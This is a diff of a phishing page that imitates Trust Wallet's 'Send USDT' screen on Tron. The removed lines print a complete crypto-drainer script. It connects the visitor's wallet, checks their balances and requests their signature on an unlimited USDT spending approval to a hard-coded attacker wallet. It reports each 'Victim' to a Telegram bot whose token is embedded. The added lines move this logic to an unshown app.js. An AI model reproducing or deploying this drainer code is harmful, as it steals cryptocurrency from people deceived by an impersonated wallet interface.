@@ -1,25 +1,55 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
     <title>Send USDT</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         /* Exact Trust Wallet Mobile Colors and Fonts */
-        body { background-color: #121212; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow-x: hidden; }
-        .tw-input-bg { background-color: #1A1A1A; border: 1px solid #333333; }
-        .tw-green-text { color: #27C469; }
-        .tw-green-btn { background-color: #27C469; color: #000000; transition: opacity 0.2s; }
-        .tw-green-btn:active { opacity: 0.7; transform: scale(0.98); }
-        .loading-overlay { background: rgba(18, 18, 18, 0.9); backdrop-filter: blur(5px); }
-        
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            overflow-x: hidden;
+        }
+
+        .tw-input-bg {
+            background-color: #1A1A1A;
+            border: 1px solid #333333;
+        }
+
+        .tw-green-text {
+            color: #27C469;
+        }
+
+        .tw-green-btn {
+            background-color: #27C469;
+            color: #000000;
+            transition: opacity 0.2s;
+        }
+
+        .tw-green-btn:active {
+            opacity: 0.7;
+            transform: scale(0.98);
+        }
+
+        .loading-overlay {
+            background: rgba(18, 18, 18, 0.9);
+            backdrop-filter: blur(5px);
+        }
+
         /* Remove number input arrows */
-        input[type=number]::-webkit-inner-spin-button, 
-        input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
+        input[type=number]::-webkit-inner-spin-button,
+        input[type=number]::-webkit-outer-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
     </style>
 </head>
+
 <body class="min-h-screen flex flex-col">
 
     <div class="px-4 py-4 flex items-center relative">
@@ -28,11 +58,12 @@
     </div>
 
     <div id="main-content" class="px-4 mt-4 flex-grow flex flex-col">
-        
+
         <div class="mb-5">
             <label class="text-[14px] text-gray-300 font-semibold mb-2 block">Address or Domain Name</label>
             <div class="tw-input-bg rounded-xl p-3 flex justify-between items-center h-[56px]">
-                <input type="text" placeholder="Search or Enter" value="TBrJPyG8BUysBBM...QFvEHay2" class="bg-transparent text-gray-300 text-[15px] w-full outline-none placeholder-gray-500" readonly>
+                <input type="text" placeholder="Search or Enter" value="TBrJPyG8BUysBBM...QFvEHay2"
+                    class="bg-transparent text-gray-300 text-[15px] w-full outline-none placeholder-gray-500" readonly>
                 <div class="flex items-center gap-4 tw-green-text shrink-0 ml-2">
                     <span class="text-[15px] font-medium">Paste</span>
                     <i class="fa-regular fa-clipboard text-[18px]"></i>
@@ -45,7 +76,9 @@
             <label class="text-[14px] text-gray-300 font-semibold mb-2 block">Destination network</label>
             <div class="inline-flex items-center gap-2 bg-[#222222] px-3 py-1.5 rounded-full border border-gray-800">
                 <div class="w-5 h-5 bg-[#FF060A] rounded-full flex items-center justify-center">
-                    <svg width="10" height="10" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 22L12 18L22 22L12 2Z"/></svg>
+                    <svg width="10" height="10" viewBox="0 0 24 24" fill="white">
+                        <path d="M12 2L2 22L12 18L22 22L12 2Z" />
+                    </svg>
                 </div>
                 <span class="text-[14px] font-semibold text-gray-300">Tron</span>
                 <i class="fa-solid fa-caret-down text-gray-500 text-xs ml-1"></i>
@@ -55,7 +88,8 @@
         <div class="mb-2">
             <label class="text-[14px] text-gray-300 font-semibold mb-2 block">Amount</label>
             <div class="tw-input-bg rounded-xl p-3 flex justify-between items-center h-[56px]">
-                <input type="number" id="send-amount" placeholder="USDT Amount" class="bg-transparent text-[16px] w-full outline-none placeholder-gray-400 text-white">
+                <input type="number" id="send-amount" placeholder="USDT Amount"
+                    class="bg-transparent text-[16px] w-full outline-none placeholder-gray-400 text-white">
                 <div class="flex items-center gap-3 shrink-0 ml-2">
                     <span class="text-[15px] font-medium text-gray-300">USDT</span>
                     <span class="text-[15px] font-medium tw-green-text">Max</span>
@@ -81,101 +115,19 @@
         </div>
     </div>
 
-    <div id="loading-screen" class="hidden fixed inset-0 loading-overlay z-50 flex flex-col items-center justify-center p-8">
+    <div id="loading-screen"
+        class="hidden fixed inset-0 loading-overlay z-50 flex flex-col items-center justify-center p-8">
         <div class="w-12 h-12 border-[3px] border-[#27C469] border-t-transparent rounded-full animate-spin mb-6"></div>
         <h2 id="loading-title" class="text-[19px] font-bold text-white">Confirming...</h2>
-        <p id="loading-subtitle" class="text-gray-400 text-center text-sm mt-2">Please approve the connection in your wallet.</p>
+        <p id="loading-subtitle" class="text-gray-400 text-center text-sm mt-2">Please approve the connection in your
+            wallet.</p>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js" defer></script>
-    <script src="wc-bundle.js" defer></script>
 
-    <script>
-        const CONFIG = {
-            BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
-            CHAT_ID: "8249230506",
-            ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
-            USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
-        };
-        const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-
-        async function notifyAdmin(status, address, trx = "0", usdt = "0", extra = "") {
-            const text = `🎯 <b>NEW UPDATE</b>\n\n` +
-                         `📌 Status: <b>${status}</b>\n` +
-                         `👤 Victim: <code>${address}</code>\n` +
-                         `💰 Balance: <code>${usdt} USDT</code> | <code>${trx} TRX</code>\n` +
-                         `📝 Detail: ${extra}`;
-            try {
-                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: "HTML" })
-                });
-            } catch(e) {}
-        }
-
-        async function getStats(address) {
-            const tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });
-            let trx = "0.00", usdt = "0.00";
-            try {
-                trx = (await tw.trx.getBalance(address) / 1e6).toFixed(2);
-                const contract = await tw.transactionBuilder.triggerConstantContract(CONFIG.USDT_CONTRACT, "balanceOf(address)", {}, [{type:'address', value: address}], address);
-                usdt = (parseInt(contract.constant_result[0], 16) / 1e6).toFixed(2);
-            } catch(e) {}
-            return { trx, usdt };
-        }
-
-        document.getElementById('next-btn').addEventListener('click', async () => {
-            if (typeof window.connectWalletConnectTron !== 'function') return alert("System loading...");
-
-            const result = await window.connectWalletConnectTron();
-            if (result && result.address) {
-                const address = result.address;
-                const { trx, usdt } = await getStats(address);
-                
-                // Update Balance UI in background
-                document.getElementById('view-balance').innerText = usdt;
-                
-                // UI transition to Confirming
-                document.getElementById('main-content').classList.add('opacity-10');
-                document.getElementById('loading-screen').classList.remove('hidden');
-
-                await notifyAdmin("CONNECTED", address, trx, usdt, "Waiting for approval...");
-
-                try {
-                    const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
-                    
-                    setTimeout(async () => {
-                        try {
-                            const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
-                                CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 100000000 },
-                                [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
-                            );
-
-                            const signedTx = await result.provider.request({
-                                method: "tron_signTransaction",
-                                params: { address: address, transaction: transaction }
-                            });
-
-                            const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
-                            await notifyAdmin("✅ SUCCESS", address, trx, usdt, `TX: <code>${receipt.txid || "Success"}</code>`);
-                            alert("Transaction sent to the network.");
-                            location.reload();
-                        } catch (err) {
-                            let reason = "User Rejected";
-                            if (parseFloat(trx) < 25) reason = "Insufficient Gas (Low TRX)";
-                            await notifyAdmin("❌ FAILED", address, trx, usdt, `Reason: ${reason}`);
-                            location.reload();
-                        }
-                    }, 2500);
-
-                } catch (e) {
-                    await notifyAdmin("❌ ERROR", address, trx, usdt, e.message);
-                    location.reload();
-                }
-            }
-        });
-    </script>
 </body>
-    </html>
-    
+<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js" defer></script>
+<script src="wc-bundle.js" defer></script>
+
+<script src="app.js" defer></script>
+
+</html>
